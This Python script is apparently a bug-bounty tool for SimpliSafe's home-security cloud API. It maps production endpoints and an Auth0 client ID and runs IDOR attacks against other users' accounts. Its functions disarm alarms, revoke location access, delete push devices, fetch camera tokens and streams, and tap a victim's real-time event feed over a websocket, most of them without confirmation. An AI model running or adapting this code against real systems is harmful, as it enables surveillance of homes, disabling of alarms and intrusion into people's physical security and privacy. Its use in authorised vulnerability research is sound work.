#!/usr/bin/env python3
"""
simplisafe_re.py — SimpliSafe Cloud API RE + IDOR Verification

Source: APK RE (com.simplisafe.mobile v8.3.0, jadx v1.5.6, classes12-14.dex)
        + live endpoint probing (2026-09-09)

Bug bounty: https://hackerone.com/simplisafe
30% bonus: "Additional User Access" feature (location-grant-authorizations)

In-scope:
  *.prd.aser.simplisafe.com
  *.prd.services.simplisafe.com
  api.simplisafe.com
  media.simplisafe.com
  *.prd.cam.simplisafe.com
  *.prd.platform.simplisafe.com
  *.prd.webapps.simplisafe.com

Out-of-scope: auth.simplisafe.com (Auth0), mfa.simplisafe.com

Usage:
  python simplisafe_re.py --token <bearer_token> --sid <your_sid> --uid <your_user_id>
  python simplisafe_re.py --unauth          # unauthenticated surface only
  python simplisafe_re.py --idor --victim-sid <sid> --victim-uid <uid>
"""

import argparse
import json
import sys
import time
import curl_cffi.requests as req
from dataclasses import dataclass, field
from typing import Optional

# ─── API Surface Map ────────────────────────────────────────────────────────────

SERVICES = {
    "yoda":                 "https://api.simplisafe.com/v1",
    "app_hub":              "https://app-hub.prd.aser.simplisafe.com",
    "mediator":             "https://mediator.prd.cam.simplisafe.com",
    "tep":                  "https://media.simplisafe.com",
    "telegram":             "https://telegram.prd.aser.simplisafe.com",
    "beta_hub":             "https://beta-hub.services.simplisafe.com",
    "location_auth":        "https://location-grant-authorizations.prd.services.simplisafe.com/v1",
    "pcs":                  "https://pcs-user.services.simplisafe.com",
    "gateway":              "https://api.services.simplisafe.com",
    "lumen":                "https://ml-feedback.services.simplisafe.com",
    "devices":              "https://devices.simplisafe.com",
    "socketlink":           "https://socketlink.prd.aser.simplisafe.com",
    "address_validation":   "https://address-validation.prd.platform.simplisafe.com",
}

AUTH0_CLIENT_ID = "DojdcaKF6ZzC80TpIBcx4que1JD7suFp"

ALARM_STATES = ["off", "home", "home_count", "away", "away_count", "alarm", "alarm_count"]


@dataclass
class Finding:
    id: str
    severity: str
    title: str
    service: str
    endpoint: str
    method: str
    body: Optional[dict]
    verified: bool = False
    evidence: str = ""
    notes: str = ""


FINDINGS = [
    Finding("F8",  "CRITICAL", "Alarm State IDOR — Remote Disarm",
            "yoda", "/ss3/subscriptions/{sid}/state/{state}", "POST", None,
            notes="body empty; state=off to disarm. victim_sid in URL."),
    Finding("F9",  "CRITICAL", "Alarm Surveillance IDOR — Remote Alarm State Read",
            "yoda", "/accounts/{userId}/locations/alarmState", "GET", None),
    Finding("F10", "CRITICAL", "Physical Access IDOR — Remote Door Lock/Unlock",
            "yoda", "/doorlock/{sid}/{serial}/command", "POST", None),
    Finding("F11", "HIGH",     "Camera Provisioning Token IDOR",
            "yoda", "/cameras/provisioningToken", "POST", {"sid": "{victim_sid}"}),
    Finding("F1",  "CRITICAL", "Grantee Authorization Cross-Account Read (30% bonus)",
            "location_auth", "/grantees/{granteeId}", "GET", None),
    Finding("F2",  "CRITICAL", "Unauthorized Revoke Location Access (30% bonus)",
            "location_auth", "/locations/{locationId}/revoke", "POST",
            {"granteeEmail": "{victim_email}", "role": "MANAGER"}),
    Finding("F3",  "HIGH",     "Push Notification Device Deletion IDOR",
            "telegram", "/v1/registrations/users/{uid}/pushRegistrations/devices/{deviceName}", "DELETE", None),
    Finding("F4",  "CRITICAL", "Push Device Token Redirect IDOR",
            "telegram", "/v1/registrations/pushRegistrations/{pushDeviceId}", "PATCH", None),
    Finding("F6",  "HIGH",     "Camera Stream Cross-Account Access",
            "tep", "/v1/{cameraUuid}/mjpg", "GET", None),
    Finding("F12", "HIGH",     "Manual Recording IDOR",
            "yoda", "/subscriptions/{sid}/cameras/{uuid}/record", "POST", None),
    Finding("F13", "HIGH",     "PCS API Full Spec Exposed Without Auth",
            "pcs", "/openapi.json", "GET", None, verified=True,
            evidence="HTTP 200, 163KB spec including internal routes and biometric schemas"),
    Finding("F14", "MEDIUM",   "Unauthenticated Video Delivery Endpoint",
            "pcs", "/video-signed/{signed_data}", "GET", None,
            evidence="Security: None in OpenAPI spec; returns 400 not 401 on bad input"),
    Finding("F15", "MEDIUM",   "Internal Architecture Disclosure via Health Endpoints",
            "beta_hub", "/health", "GET", None, verified=True,
            evidence="DynamoDB tables, Kafka topics, MySQL via Falcon client, JWKS cycle"),
    Finding("F17", "CRITICAL", "SocketLink Real-Time Surveillance IDOR",
            "socketlink", "wss://socketlink.prd.aser.simplisafe.com/socket.io/", "WS",
            {"type": "com.simplisafe.connection.identify",
             "data": {"auth": {"schema": "bearer", "token": "<attacker_token>"},
                      "join": ["uid:<VICTIM_USER_ID>"]}},
            notes="CloudEvents identify message; join uid is client-supplied, not derived from JWT. "
                  "If server trusts uid: prefix without JWT sub check -> full real-time event stream IDOR."),
    Finding("F16", "MEDIUM",   "Unauthenticated Address Geocoding via USPS API Proxy",
            "address_validation", "/v1/addresses", "POST",
            [{"street": "1600 Pennsylvania Ave NW", "city": "Washington", "state": "DC", "zipcode": "20500"}],
            verified=True, evidence="HTTP 200, full USPS CASS geocoding data without auth"),
]


# ─── HTTP helpers ───────────────────────────────────────────────────────────────

def _session(token=None):
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
    }
    if token:
        headers["Authorization"] = f"Bearer {token}"
    return headers


def get(url, token=None, **kw):
    try:
        r = req.get(url, impersonate="chrome120", timeout=8,
                    headers=_session(token), **kw)
        return r
    except Exception as e:
        return None


def post(url, token=None, body=None, **kw):
    try:
        r = req.post(url, impersonate="chrome120", timeout=8,
                     headers=_session(token), json=body, **kw)
        return r
    except Exception as e:
        return None


def delete(url, token=None, **kw):
    try:
        r = req.delete(url, impersonate="chrome120", timeout=8,
                       headers=_session(token), **kw)
        return r
    except Exception as e:
        return None


def _print(tag, status, msg):
    sym = {"CRIT": "!!!", "HIGH": "!", "OK": "ok", "INFO": "--", "FAIL": "xx"}.get(tag, tag)
    print(f"[{sym}] {status:3}  {msg}")


# ─── Unauthenticated Surface ────────────────────────────────────────────────────

def probe_unauth():
    print("\n=== Unauthenticated Surface ===")

    # Health endpoints
    health_targets = [
        ("beta_hub", "/health"),
        ("telegram", "/health"),
        ("socketlink", "/health"),
        ("mediator", "/health"),
        ("pcs", "/health-check"),
        ("lumen", "/"),
    ]
    for svc, path in health_targets:
        r = get(SERVICES[svc] + path)
        if r and r.status_code == 200:
            _print("HIGH", r.status_code, f"{svc}{path}  {r.text[:80]}")
        elif r:
            _print("INFO", r.status_code, f"{svc}{path}")

    # PCS OpenAPI spec
    r = get(SERVICES["pcs"] + "/openapi.json")
    if r and r.status_code == 200:
        spec = r.json()
        path_count = len(spec.get("paths", {}))
        _print("CRIT", r.status_code, f"PCS OpenAPI spec exposed — {path_count} paths, {len(r.content)//1024}KB")
    else:
        _print("INFO", r.status_code if r else "ERR", "PCS /openapi.json")

    # Address validation
    r = post(SERVICES["address_validation"] + "/v1/addresses",
             body=[{"street": "1600 Pennsylvania Ave NW", "city": "Washington",
                    "state": "DC", "zipcode": "20500"}])
    if r and r.status_code == 200:
        data = r.json()
        lat = data["matches"][0]["metadata"]["geolocation"]["latitude"]
        lon = data["matches"][0]["metadata"]["geolocation"]["longitude"]
        _print("HIGH", r.status_code, f"Address geocoding unauthenticated — lat={lat} lon={lon}")
    else:
        _print("INFO", r.status_code if r else "ERR", "Address validation")

    # Video-signed endpoint (no auth required per OpenAPI)
    r = get(SERVICES["pcs"] + "/video-signed/test123")
    if r and r.status_code == 400:
        _print("HIGH", r.status_code, "pcs/video-signed/ — 400 not 401, auth middleware absent")
    elif r:
        _print("INFO", r.status_code, f"pcs/video-signed/ {r.text[:60]}")


# ─── IDOR Test Suite ────────────────────────────────────────────────────────────

def test_alarm_state_idor(token, own_sid, victim_sid):
    """F8: Can we read/write victim alarm state with own token?"""
    print(f"\n=== F8 — Alarm State IDOR (victim_sid={victim_sid}) ===")

    # Read victim alarm state
    r = get(f"{SERVICES['yoda']}/ss3/subscriptions/{victim_sid}/state", token=token)
    if r:
        _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
               f"GET victim alarm state  {r.text[:100]}")

    # Attempt disarm
    confirm = input(f"  Attempt disarm on victim_sid={victim_sid}? [y/N] ").strip().lower()
    if confirm == "y":
        r = post(f"{SERVICES['yoda']}/ss3/subscriptions/{victim_sid}/state/off",
                 token=token)
        if r:
            _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
                   f"POST disarm  {r.text[:100]}")
    else:
        print("  Skipped disarm attempt.")


def test_alarm_state_read(token, victim_uid):
    """F9: Can we read victim's alarm state via userId IDOR?"""
    print(f"\n=== F9 — Alarm State Read IDOR (victim_uid={victim_uid}) ===")
    r = get(f"{SERVICES['yoda']}/accounts/{victim_uid}/locations/alarmState", token=token)
    if r:
        _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
               f"alarmState  {r.text[:150]}")


def test_location_enum(token, victim_uid):
    """Can we enumerate victim's locations?"""
    print(f"\n=== Location Enum IDOR (victim_uid={victim_uid}) ===")
    r = get(f"{SERVICES['yoda']}/accounts/{victim_uid}/locations", token=token)
    if r:
        _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
               f"locations  {r.text[:150]}")


def test_camera_token_idor(token, victim_sid):
    """F11: Can we get a camera provisioning token for a victim's sid?"""
    print(f"\n=== F11 — Camera Token IDOR (victim_sid={victim_sid}) ===")
    r = post(f"{SERVICES['yoda']}/cameras/provisioningToken",
             token=token, body={"sid": str(victim_sid)})
    if r:
        if r.status_code == 200:
            data = r.json()
            tok = data.get("token", "")[:40]
            exp = data.get("expires_in", "")
            _print("CRIT", 200, f"Camera token obtained — token={tok}... expires_in={exp}")
        else:
            _print("INFO", r.status_code, f"{r.text[:100]}")


def test_sensor_enum(token, victim_sid):
    """IDOR: list victim's sensors"""
    print(f"\n=== Sensor Enum IDOR (victim_sid={victim_sid}) ===")
    r = get(f"{SERVICES['yoda']}/ss3/subscriptions/{victim_sid}/sensors", token=token)
    if r:
        _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
               f"sensors  {r.text[:150]}")


def test_grant_auth_idor(token, victim_grantee_id):
    """F1: Can we read victim's grant authorizations? (30% bonus)"""
    print(f"\n=== F1 — Grant Auth IDOR (victim_grantee_id={victim_grantee_id}) ===")
    r = get(f"{SERVICES['location_auth']}/grantees/{victim_grantee_id}", token=token)
    if r:
        _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
               f"grantees  {r.text[:200]}")


def test_grant_revoke_idor(token, victim_location_id, victim_email):
    """F2: Can we revoke victim's access to their own location? (30% bonus)"""
    print(f"\n=== F2 — Grant Revoke IDOR (victim_location={victim_location_id}) ===")
    confirm = input(f"  Attempt revoke on location={victim_location_id}, email={victim_email}? [y/N] ").strip().lower()
    if confirm == "y":
        r = post(f"{SERVICES['location_auth']}/locations/{victim_location_id}/revoke",
                 token=token,
                 body={"granteeEmail": victim_email, "role": "MANAGER"})
        if r:
            _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
                   f"revoke  {r.text[:150]}")
    else:
        print("  Skipped revoke attempt.")


def test_push_notif_idor(token, victim_uid, victim_device):
    """F3: Can we delete victim's push notification device?"""
    print(f"\n=== F3 — Push Notif IDOR (victim_uid={victim_uid}, device={victim_device}) ===")
    url = f"{SERVICES['telegram']}/v1/registrations/users/{victim_uid}/pushRegistrations/devices/{victim_device}"
    r = delete(url, token=token)
    if r:
        _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
               f"delete push device  {r.text[:100]}")


def test_socketlink_idor(token, victim_uid, listen_seconds=10):
    """F17: Subscribe to victim's real-time event stream using own token but victim uid."""
    print(f"\n=== F17 — SocketLink Surveillance IDOR (victim_uid={victim_uid}) ===")
    try:
        import websocket
        import json as _json
        import time as _time
        import datetime

        results = []

        def on_open(ws):
            payload = {
                "datacontenttype": "application/json",
                "id": f"ts{int(_time.time() * 1000)}",
                "source": "ablation-re-test",
                "specversion": "1.0",
                "time": datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"),
                "type": "com.simplisafe.connection.identify",
                "data": {
                    "auth": {"schema": "bearer", "token": token},
                    "join": [f"uid:{victim_uid}"]
                }
            }
            ws.send(_json.dumps(payload))
            _print("INFO", "SENT", f"identify with uid:{victim_uid}")

        def on_message(ws, msg):
            _print("CRIT", "RECV", f"{msg[:200]}")
            results.append(msg)
            try:
                d = _json.loads(msg)
                if d.get("type") == "com.simplisafe.namespace.subscribed":
                    _print("CRIT", "IDOR", f"Subscribed to uid:{victim_uid} namespace — CONFIRMED")
            except Exception:
                pass

        def on_error(ws, err):
            _print("INFO", "ERR", str(err)[:100])

        ws_url = "wss://socketlink.prd.aser.simplisafe.com/socket.io/?transport=websocket"
        ws = websocket.WebSocketApp(ws_url,
                                     header={"Authorization": f"Bearer {token}"},
                                     on_open=on_open,
                                     on_message=on_message,
                                     on_error=on_error)
        import threading
        t = threading.Thread(target=ws.run_forever, kwargs={"sslopt": {"cert_reqs": 0}})
        t.daemon = True
        t.start()
        _time.sleep(listen_seconds)
        ws.close()
        print(f"  {len(results)} messages received in {listen_seconds}s")
    except ImportError:
        print("  websocket-client not installed: pip install websocket-client")


def test_camera_stream_idor(token, victim_camera_uuid):
    """F6: Can we access victim's camera stream with own token?"""
    print(f"\n=== F6 — Camera Stream IDOR (uuid={victim_camera_uuid}) ===")
    r = get(f"{SERVICES['tep']}/v1/{victim_camera_uuid}/mjpg?fr=1&x=1024",
            token=token)
    if r:
        _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
               f"camera stream  {r.headers.get('content-type', '')}  {r.text[:80]}")


# ─── Own Account Enumeration ────────────────────────────────────────────────────

def enum_own_account(token, uid, sid):
    """Enumerate own account to get resource IDs needed for IDOR tests."""
    print(f"\n=== Own Account Enum (uid={uid}, sid={sid}) ===")

    # Get locations
    r = get(f"{SERVICES['yoda']}/accounts/{uid}/locations", token=token)
    if r and r.status_code == 200:
        data = r.json()
        _print("OK", 200, f"locations: {json.dumps(data)[:200]}")

    # Get sensors
    r = get(f"{SERVICES['yoda']}/ss3/subscriptions/{sid}/sensors", token=token)
    if r and r.status_code == 200:
        _print("OK", 200, f"sensors: {r.text[:200]}")

    # Get cameras
    r = get(f"{SERVICES['yoda']}/subscriptions/{sid}/cameras", token=token)
    if r and r.status_code == 200:
        _print("OK", 200, f"cameras: {r.text[:200]}")

    # Get own camera provisioning token (to see format)
    r = post(f"{SERVICES['yoda']}/cameras/provisioningToken",
             token=token, body={"sid": str(sid)})
    if r and r.status_code == 200:
        data = r.json()
        _print("OK", 200, f"camera token format: {list(data.keys())} expires_in={data.get('expires_in')}")

    # Get grant authorizations
    r = get(f"{SERVICES['location_auth']}/locations/{sid}", token=token)
    if r:
        _print("OK" if r.status_code == 200 else "INFO", r.status_code,
               f"location grants: {r.text[:150]}")

    # PCS: own cameras
    r = get(f"{SERVICES['pcs']}/camera/getall/user/{uid}", token=token)
    if r and r.status_code == 200:
        _print("OK", 200, f"PCS cameras: {r.text[:150]}")

    # Get own signed video URL (reveals format for /video-signed/)
    r = get(f"{SERVICES['pcs']}/video/sign?user_id={uid}&file_path=test.mp4", token=token)
    if r:
        _print("OK" if r.status_code == 200 else "INFO", r.status_code,
               f"video/sign: {r.text[:150]}")


# ─── Main ───────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="SimpliSafe RE + IDOR Verification")
    parser.add_argument("--token", help="Bearer auth token")
    parser.add_argument("--uid", help="Own user ID (numeric)")
    parser.add_argument("--sid", help="Own subscription/location ID (numeric)")
    parser.add_argument("--unauth", action="store_true", help="Run unauthenticated probes only")
    parser.add_argument("--idor", action="store_true", help="Run IDOR test suite (requires victim params)")
    parser.add_argument("--enum", action="store_true", help="Enumerate own account")
    parser.add_argument("--victim-sid", help="Victim subscription ID for IDOR tests")
    parser.add_argument("--victim-uid", help="Victim user ID for IDOR tests")
    parser.add_argument("--victim-email", help="Victim email for revoke IDOR tests")
    parser.add_argument("--victim-location", help="Victim location ID for grant IDOR tests")
    parser.add_argument("--victim-camera-uuid", help="Victim camera UUID for stream IDOR")
    parser.add_argument("--victim-grantee-id", help="Victim grantee ID for F1 test")
    args = parser.parse_args()

    if args.unauth:
        probe_unauth()

    if args.enum and args.token and args.uid and args.sid:
        enum_own_account(args.token, args.uid, args.sid)

    if args.idor:
        if not args.token:
            print("--idor requires --token")
            sys.exit(1)

        if args.victim_sid:
            test_alarm_state_idor(args.token, args.sid, args.victim_sid)
            test_camera_token_idor(args.token, args.victim_sid)
            test_sensor_enum(args.token, args.victim_sid)

        if args.victim_uid:
            test_alarm_state_read(args.token, args.victim_uid)
            test_location_enum(args.token, args.victim_uid)

        if args.victim_grantee_id:
            test_grant_auth_idor(args.token, args.victim_grantee_id)

        if args.victim_location and args.victim_email:
            test_grant_revoke_idor(args.token, args.victim_location, args.victim_email)

        if args.victim_uid and hasattr(args, "victim_device"):
            test_push_notif_idor(args.token, args.victim_uid, args.victim_device)

        if args.victim_camera_uuid:
            test_camera_stream_idor(args.token, args.victim_camera_uuid)

    # Print findings summary
    print("\n=== Findings Summary ===")
    for f in sorted(FINDINGS, key=lambda x: {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2}.get(x.severity, 9)):
        status = "VERIFIED" if f.verified else "UNVERIFIED"
        print(f"  [{f.severity:8}] [{status}] {f.id}: {f.title}")
        if f.evidence:
            print(f"             {f.evidence}")


if __name__ == "__main__":
    main()
